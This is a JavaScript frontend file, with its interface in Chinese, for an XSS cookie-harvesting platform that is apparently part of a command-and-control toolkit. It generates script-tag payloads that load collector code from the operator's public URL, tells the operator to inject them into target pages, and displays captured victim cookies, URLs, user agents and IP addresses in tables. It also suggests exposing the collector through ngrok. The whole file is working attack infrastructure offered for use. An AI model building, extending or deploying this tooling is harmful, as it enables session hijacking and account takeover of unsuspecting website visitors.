// XSS cookie-harvesting platform frontend logic.
// Bound to the #xss-tab in index.html; uses the XSS global object pattern
// established by c2.js / terminal.js.
var XSS = (function () {
	"use strict";

	var module = {};
	var currentPayloads = [];
	var currentCaptures = [];
	var activeTab = "payloads";

	// ------------------------------------------------------------------
	// API helper
	// ------------------------------------------------------------------
	function api(path, options) {
		options = options || {};
		options.headers = Object.assign(options.headers || {}, {
			"Content-Type": "application/json",
		});
		return fetch(window.PREFIX + path, options).then(function (res) {
			if (!res.ok) {
				return res.json().then(function (data) {
					throw new Error(data.error || ("HTTP " + res.status));
				});
			}
			return res.json();
		});
	}

	// ------------------------------------------------------------------
	// Config
	// ------------------------------------------------------------------
	module.showConfig = function () {
		api("/xss/config")
			.then(function (data) {
				alert(
					"XSS 收集服务配置\n\n" +
						"监听地址: " + data.bind_host + ":" + data.bind_port + "\n" +
						"公网访问地址: " + (data.public_url || "(未设置)") + "\n" +
						"冷却时间: " + data.cooldown_seconds + " 秒\n" +
						"状态: " + (data.enabled ? "已启用" : "已关闭") + "\n\n" +
						"收集器监听在 " + data.bind_host + ":" + data.bind_port +
						"，通过反向代理或 ngrok 映射到公网即可使用。"
				);
			})
			.catch(function (err) {
				alert("获取配置失败: " + err.message);
			});
	};

	// ------------------------------------------------------------------
	// Payload management
	// ------------------------------------------------------------------
	module.openGenerateModal = function () {
		var html =
			'<div class="modal-backdrop">' +
			'<div class="modal" style="max-width:600px">' +
			'<div class="modal-header"><span class="modal-title">生成 XSS 载荷</span><button class="modal-close" onclick="XSS.closeGenerateModal()">×</button></div>' +
			'<div class="modal-body">' +
			'<form id="xss-generate-form">' +
			'<div class="form-group">' +
			'<label>载荷名称</label>' +
			'<input type="text" name="name" class="form-input" placeholder="例如: 首页cookie劫持" required>' +
			'</div>' +
			'<div class="form-group">' +
			'<label>载荷类型</label>' +
			'<select name="type" class="form-select">' +
			'<option value="image">Image Beacon (推荐)</option>' +
			'<option value="fetch">Fetch API</option>' +
			'</select>' +
			'</div>' +
			'<div class="form-group">' +
			'<label>描述 (选填)</label>' +
			'<input type="text" name="description" class="form-input" placeholder="载荷用途描述">' +
			'</div>' +
			'<div class="form-group">' +
			'<label>目标域名 (选填，留空为所有)</label>' +
			'<input type="text" name="domain" class="form-input" placeholder="例如: example.com">' +
			'</div>' +
			'<div class="form-group">' +
			'<label>自定义 Payload (选填，留空使用默认收集代码)</label>' +
			'<textarea name="payload" class="form-textarea" rows="3" placeholder="<script src=..."></textarea>' +
			'</div>' +
			'</form>' +
			'</div>' +
			'<div class="modal-footer">' +
			'<button class="btn btn-secondary" onclick="XSS.closeGenerateModal()">取消</button>' +
			'<button class="btn btn-primary" onclick="XSS.generatePayload()">生成</button>' +
			'</div>' +
			'</div>' +
			'</div>';
		var el = document.createElement("div");
		el.innerHTML = html;
		document.body.appendChild(el);
		el.querySelector(".modal-backdrop").addEventListener("click", function (e) {
			if (e.target === el.querySelector(".modal-backdrop")) {
				module.closeGenerateModal();
			}
		});
	};

	module.closeGenerateModal = function () {
		var backdrop = document.querySelector(".modal-backdrop");
		if (backdrop) {
			backdrop.parentElement.remove();
		}
	};

	module.generatePayload = function () {
		var form = document.getElementById("xss-generate-form");
		if (!form) return;
		var name = form.name.value.trim();
		var type = form.type.value;
		var description = form.description.value.trim();
		var domain = form.domain.value.trim();
		var payload = form.payload.value.trim();

		if (!name) {
			alert("请填写载荷名称");
			return;
		}

		// If no custom payload provided, generate the default collector JS payload
		if (!payload) {
			payload = '<script src="' + (window.XSS_PUBLIC_URL || "") + '/xss/PAYLOAD_TOKEN.js"></script>';
		}

		api("/xss/payloads", {
			method: "POST",
			body: JSON.stringify({
				name: name,
				type: type,
				payload: payload,
				description: description,
				domain: domain,
			}),
		})
			.then(function (data) {
				module.closeGenerateModal();
				module.loadPayloads();
				// Show the generated payload with the actual token
				var jsPayload = '<script src="' + (window.XSS_PUBLIC_URL || "") + '/xss/' + data.token + '.js"></script>';
				var resultHtml =
					'<div class="modal-backdrop">' +
					'<div class="modal" style="max-width:600px">' +
					'<div class="modal-header"><span class="modal-title">XSS 载荷生成成功</span><button class="modal-close" onclick="this.closest(\'.modal-backdrop\').remove()">×</button></div>' +
					'<div class="modal-body">' +
					'<p><strong>Token:</strong> <code>' + data.token + '</code></p>' +
					'<p><strong>注入代码：</strong></p>' +
					'<pre class="code-block" id="xss-payload-code">' + jsPayload + '</pre>' +
					'<p><strong>收集 URL：</strong></p>' +
					'<pre class="code-block">' + (window.XSS_PUBLIC_URL || "") + '/xss/' + data.token + '.js</pre>' +
					'<p>将以上 <code>&lt;script&gt;</code> 代码注入到目标页面即可。</p>' +
					'</div>' +
					'<div class="modal-footer">' +
					'<button class="btn btn-secondary" onclick="navigator.clipboard.writeText(document.getElementById(\'xss-payload-code\').textContent)">复制</button>' +
					'</div>' +
					'</div>' +
					'</div>';
				var el = document.createElement("div");
				el.innerHTML = resultHtml;
				document.body.appendChild(el);
			})
			.catch(function (err) {
				alert("生成失败: " + err.message);
			});
	};

	module.loadPayloads = function () {
		api("/xss/payloads")
			.then(function (data) {
				currentPayloads = data.payloads || [];
				module.renderPayloads();
			})
			.catch(function (err) {
				console.error("加载 payload 失败:", err);
			});
	};

	module.renderPayloads = function () {
		var container = document.getElementById("xss-payloads-list");
		if (!container) return;
		if (currentPayloads.length === 0) {
			container.innerHTML = '<div class="empty-state">暂无 XSS 载荷，点击"生成载荷"按钮创建一个。</div>';
			return;
		}
		var html = '<table class="data-table"><thead><tr>' +
			'<th>名称</th><th>类型</th><th>Token</th><th>描述</th>' +
			'<th>域名</th><th>状态</th><th>创建时间</th><th>捕获数</th><th>操作</th>' +
			'</tr></thead><tbody>';
		for (var i = 0; i < currentPayloads.length; i++) {
			var p = currentPayloads[i];
			html += "<tr>";
			html += "<td>" + (p.name || "") + "</td>";
			html += "<td>" + (p.type || "") + "</td>";
			html += "<td><code>" + (p.token || "") + "</code></td>";
			html += "<td>" + (p.description || "") + "</td>";
			html += "<td>" + (p.domain || "") + "</td>";
			html += "<td>" + (p.enabled ? "启用" : "禁用") + "</td>";
			html += "<td>" + (p.created_at ? p.created_at.substring(0, 19) : "") + "</td>";
			html += "<td>" + (p.capture_count || 0) + "</td>";
			html += '<td><button class="btn btn-sm btn-danger" onclick="XSS.deletePayload(' + p.id + ')">删除</button></td>';
			html += "</tr>";
		}
		html += "</tbody></table>";
		container.innerHTML = html;
	};

	module.deletePayload = function (id) {
		if (!confirm("确定删除该载荷及其所有捕获记录吗？")) return;
		api("/xss/payloads/" + id, { method: "DELETE" })
			.then(function () {
				module.loadPayloads();
			})
			.catch(function (err) {
				alert("删除失败: " + err.message);
			});
	};

	// ------------------------------------------------------------------
	// Capture management
	// ------------------------------------------------------------------
	module.loadCaptures = function () {
		api("/xss/captures")
			.then(function (data) {
				currentCaptures = data.captures || [];
				module.renderCaptures();
			})
			.catch(function (err) {
				console.error("加载 captures 失败:", err);
			});
	};

	module.renderCaptures = function () {
		var container = document.getElementById("xss-captures-list");
		if (!container) return;
		if (currentCaptures.length === 0) {
			container.innerHTML = '<div class="empty-state">暂无捕获记录。</div>';
			return;
		}
		var html = '<table class="data-table"><thead><tr>' +
			'<th>Token</th><th>Cookie</th><th>URL</th><th>User-Agent</th><th>IP</th><th>时间</th>' +
			'</tr></thead><tbody>';
		for (var i = 0; i < currentCaptures.length; i++) {
			var c = currentCaptures[i];
			html += "<tr>";
			html += "<td><code>" + (c.token || "").substring(0, 12) + "...</code></td>";
			html += '<td><pre class="cookie-cell">' + (c.cookie || "") + '</pre></td>';
			html += "<td>" + (c.url || "") + "</td>";
			html += "<td>" + (c.user_agent || "") + "</td>";
			html += "<td>" + (c.ip || "") + "</td>";
			html += "<td>" + (c.created_at ? c.created_at.substring(0, 19) : "") + "</td>";
			html += "</tr>";
		}
		html += "</tbody></table>";
		container.innerHTML = html;
	};

	// ------------------------------------------------------------------
	// Tab switching
	// ------------------------------------------------------------------
	module.switchTab = function (tab) {
		activeTab = tab;
		var tabs = document.querySelectorAll("[data-xss-tab]");
		for (var i = 0; i < tabs.length; i++) {
			tabs[i].classList.remove("active");
		}
		var contents = document.querySelectorAll("[data-xss-content]");
		for (var j = 0; j < contents.length; j++) {
			contents[j].style.display = "none";
		}
		document.querySelector('[data-xss-tab="' + tab + '"]').classList.add("active");
		document.querySelector('[data-xss-content="' + tab + '"]').style.display = "block";
		if (tab === "payloads") {
			module.loadPayloads();
		} else if (tab === "captures") {
			module.loadCaptures();
		}
	};

	// ------------------------------------------------------------------
	// Refresh
	// ------------------------------------------------------------------
	module.refresh = function () {
		if (activeTab === "payloads") {
			module.loadPayloads();
		} else if (activeTab === "captures") {
			module.loadCaptures();
		}
	};

	// ------------------------------------------------------------------
	// Init
	// ------------------------------------------------------------------
	module.init = function () {
		module.loadPayloads();
		setInterval(function () {
			if (document.getElementById("xss-payloads-list")) {
				module.loadPayloads();
			}
			if (document.getElementById("xss-captures-list")) {
				module.loadCaptures();
			}
		}, 5000);
	};

	return module;
})();
